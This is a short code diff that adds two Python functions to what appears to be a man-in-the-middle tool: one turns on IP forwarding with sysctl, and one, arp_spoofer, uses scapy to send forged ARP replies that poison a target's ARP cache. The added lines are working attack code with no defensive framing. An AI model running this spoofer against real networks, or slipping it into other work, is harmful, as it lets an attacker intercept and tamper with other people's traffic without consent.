@@ -69,3 +69,10 @@ def clients( arp_res, gateway_res):
                 client_list.append(item)
     return client_list
 
+def allow_ip_forwarding():
+    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
+    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])
+    
+def arp_spoofer(target_ip, target_mac, spoof_ip):
+    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(pkt, verbose=False)
